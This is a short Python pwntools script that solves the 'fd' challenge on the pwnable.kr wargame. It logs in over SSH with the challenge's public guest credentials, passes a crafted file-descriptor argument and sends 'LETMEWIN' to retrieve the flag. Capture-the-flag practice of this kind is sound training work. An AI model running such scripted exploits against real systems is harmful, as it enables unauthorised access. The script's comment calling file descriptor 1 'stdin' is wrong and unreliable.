from pwn import *

# fd
host = 'pwnable.kr'
user = 'fd'
password = 'guest'
port = 2222

# Notes
#   * Pass 0x1234 + 1 to set the file descriptor to 1 (stdin)
#   * Send 'LETMEWIN\n' to stdin to get the flag

def attack():
  s = ssh(host=host, user=user, password=password, port=port)
  p = s.process(['./fd', str(0x1234 + 1)])
  p.sendline('LETMEWIN')
  print p.recvall()

if __name__ == '__main__':
  attack()
